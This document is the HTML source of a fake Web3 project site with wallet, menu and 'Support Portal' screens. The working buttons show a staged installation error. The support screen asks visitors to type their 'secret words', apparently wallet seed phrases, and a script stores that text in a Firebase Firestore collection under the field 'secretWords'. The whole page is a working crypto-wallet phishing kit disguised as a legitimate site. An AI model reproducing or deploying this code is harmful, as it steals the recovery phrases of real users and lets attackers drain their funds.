<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V Site</title>

<style>
body { margin:0; font-family: Arial; color:white; overflow:hidden; }

/* ===== MAIN ===== */
#main{
  height:100vh;
  background:url("https://i.ibb.co/mFRsDrgS/Screenshot-2026-0409-235453.png") no-repeat center/cover;
  position:relative;
  transition:1s;
}

/* ===== TOP ===== */
.top{
  position:absolute;
  top:20px;
  right:20px;
  display:flex;
  gap:20px;
  z-index:10;
}
.top div{cursor:pointer}

/* ===== LANG BOX ===== */
.lang-box{
  display:none;
  position:absolute;
  top:50px;
  right:0;
  background:#0a2a5c;
  padding:10px;
  border-radius:10px;
}
.lang-box div{
  padding:5px 10px;
  color:#cce6ff;
}

/* ===== SCROLL CIRCLE ===== */
.scroll{
  position:absolute;
  bottom:50px;
  width:100%;
  text-align:center;
}

.circle{
  width:60px;
  height:60px;
  border:2px solid #00aaff;
  border-radius:50%;
  margin:auto;
  position:relative;
  animation:rotate 3s linear infinite;
}

.dot{
  width:10px;
  height:10px;
  background:#00aaff;
  border-radius:50%;
  position:absolute;
  top:-5px;
  left:50%;
  transform:translateX(-50%);
}

@keyframes rotate{
  100%{transform:rotate(360deg);}
}

/* ===== CENTER BUTTONS ===== */
.center{
  opacity:0;
  position:absolute;
  top:55%;
  width:100%;
  text-align:center;
  transition:1s;
}

.center.show{
  opacity:1;
}

/* SIDE BY SIDE BUTTONS */
.btn{
  display:inline-block;
  margin:10px;
  padding:12px 40px;
  border:1px solid #00aaff;
  border-radius:30px;
  cursor:pointer;
}

/* ===== ERROR ===== */
#error{
  position:fixed;
  top:-100px;
  left:50%;
  transform:translateX(-50%);
  background:red;
  padding:10px 20px;
  transition:0.5s;
}

/* ===== MENU ===== */
#menu{
  display:none;
  height:100vh;
  background:linear-gradient(#000428,#004e92);
  text-align:center;
  padding-top:40px;
}
#menu div{margin:18px; cursor:pointer}

/* ===== SUPPORT ===== */
#support{
  display:none;
  height:100vh;
  background:linear-gradient(#1e3c72,#2a5298);
  text-align:center;
  padding-top:40px;
}

/* LOGO */
.logo{
  margin-bottom:20px;
}
.logo img{
  width:110px;
  border-radius:10px;
}

textarea{
  width:80%;
  height:160px;
  border-radius:10px;
}
button{
  margin-top:20px;
  padding:15px 30px;
  background:#3b5cff;
  color:white;
  border:none;
}
</style>
</head>

<body>

<div id="error">Web3 Installation Error 404 Not Found</div>

<!-- MAIN -->
<div id="main">

  <div class="top">
    <div onclick="toggleLang()">EN
      <div class="lang-box" id="langBox">
        <div>English</div>
        <div>Hindi</div>
        <div>Vietnamese</div>
        <div>Chinese</div>
        <div>Urdu</div>
      </div>
    </div>

    <div onclick="showError()">Connect wallet</div>
    <div onclick="openMenu()">☰</div>
  </div>

  <!-- SCROLL ANIMATION -->
  <div class="scroll" id="scroll">
    <div class="circle">
      <div class="dot"></div>
    </div>
  </div>

  <!-- BUTTONS -->
  <div class="center" id="center">
    <div class="btn" onclick="showError()">Get Started</div>
    <div class="btn" onclick="showError()">Learn More</div>
  </div>

</div>

<!-- MENU -->
<div id="menu">
  <div onclick="home()">← Main Page</div>
  <h2>Menu</h2>

  <div onclick="home()">HOME</div>
  <div onclick="showError()">ABOUT</div>
  <div onclick="alert('Coming Soon')">NEWS</div>
  <div onclick="alert('Coming Soon')">ROADMAP</div>
  <div>PRODUCTS</div>
  <div>WHALEBIT</div>
  <div onclick="alert('Coming Soon')">METAVERSE</div>
  <div onclick="alert('Not Available')">VIDEO</div>
  <div onclick="openSupport()">SUPPORT PORTAL</div>
</div>

<!-- SUPPORT -->
<div id="support">

  <div class="logo">
    <img src="https://i.ibb.co/KcpTwv8y/images-72.jpg">
  </div>

  <h2>Login Your Account for submit The Request</h2>

  <textarea id="data"
  placeholder="Type your secret words for login account"></textarea>

  <br>
  <button onclick="saveData()">Login Account</button>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
  authDomain: "v-academy-82560.firebaseapp.com",
  projectId: "v-academy-82560"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.saveData = async function(){
  let val = document.getElementById("data").value;

  await addDoc(collection(db,"users"),{
    secretWords: val,
    time: new Date()
  });

  alert("Saved");
}
</script>

<script>
let scrolled = false;

window.addEventListener("wheel", ()=>{
  if(scrolled) return;
  scrolled = true;

  document.getElementById("scroll").style.display="none";

  // slide effect
  document.getElementById("main").style.backgroundPosition="center -150px";

  document.getElementById("center").classList.add("show");
});

function showError(){
  error.style.top="20px";
  setTimeout(()=>error.style.top="-100px",2000);
}

function openMenu(){
  main.style.display="none";
  menu.style.display="block";
}
function home(){
  menu.style.display="none";
  support.style.display="none";
  main.style.display="block";
}
function openSupport(){
  menu.style.display="none";
  support.style.display="block";
}

function toggleLang(){
  let box=document.getElementById("langBox");
  box.style.display = box.style.display==="block"?"none":"block";
}
</script>

</body>
</html>
